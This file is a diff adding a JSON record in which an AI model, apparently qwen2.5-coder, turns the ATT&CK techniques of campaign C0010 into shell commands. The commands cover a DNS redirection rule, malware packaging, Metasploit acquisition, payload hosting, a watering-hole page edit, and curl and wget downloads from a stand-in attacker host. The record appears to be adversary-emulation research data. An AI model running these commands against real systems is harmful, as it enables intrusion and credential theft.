@@ -1,0 +1,97 @@
+{
+  "campaign_id": "C0010",
+  "model": "qwen2.5-coder:14b",
+  "sample": 2,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dns-spoofing",
+      "command": "iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 192.168.1.100",
+      "target": "network.private_interface",
+      "parameters": {
+        "spoofed_domain": "linkedin.com",
+        "redirect_ip": "192.168.1.100"
+      }
+    },
+    {
+      "technique_id": "T1584.001",
+      "mechanism": "domain-compromise",
+      "command": "nslookup compromised.shippingcompany.com 192.168.1.100",
+      "target": "network.private_interface",
+      "parameters": {
+        "compromised_domain": "compromised.shippingcompany.com",
+        "dns_server": "192.168.1.100"
+      }
+    },
+    {
+      "technique_id": "T1587.001",
+      "mechanism": "malware-development",
+      "command": "python3 -m venv malware_env && source malware_env/bin/activate && pip install pyinstaller && pyinstaller --onefile sugarush.py",
+      "target": "runtime.python3",
+      "parameters": {
+        "malware_script": "sugarush.py",
+        "output_file": "sugarush"
+      }
+    },
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "tool-acquisition",
+      "command": "git clone https://github.com/rapid7/metasploit-framework.git && cd metasploit-framework && bundle install",
+      "target": "runtime.python3",
+      "parameters": {
+        "tool_repo_url": "https://github.com/rapid7/metasploit-framework.git"
+      }
+    },
+    {
+      "technique_id": "T1608.001",
+      "mechanism": "malware-upload",
+      "command": "python3 -m http.server 8080",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "port": 8080
+      }
+    },
+    {
+      "technique_id": "T1608.002",
+      "mechanism": "tool-upload",
+      "command": "python3 -m http.server 8081",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "port": 8081
+      }
+    },
+    {
+      "technique_id": "T1608.004",
+      "mechanism": "watering-hole-setup",
+      "command": "sed -i 's/login.php/login_modified.php/g' /var/www/html/index.html && cp login_modified.php /var/www/html/",
+      "target": "web_asset.benign_landing",
+      "parameters": {
+        "original_file": "index.html",
+        "modified_file": "login_modified.php"
+      }
+    },
+    {
+      "technique_id": "T1189",
+      "mechanism": "drive-by-compromise",
+      "command": "curl -o /tmp/login_modified.php http://attacker-server.com/login_modified.php",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "http://attacker-server.com/login_modified.php"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "ingress-tool-transfer",
+      "command": "wget http://endpoint.public_service:8081/metasploit.tar.gz -O /tmp/metasploit.tar.gz && tar -xzvf /tmp/metasploit.tar.gz -C /opt/",
+      "target": "actor.primary",
+      "parameters": {
+        "url": "http://endpoint.public_service:8081/metasploit.tar.gz"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "e172deced2f7ff1cd5f397b4904331561750d6fc59daca2bbb58189a35c5c91f"
+}
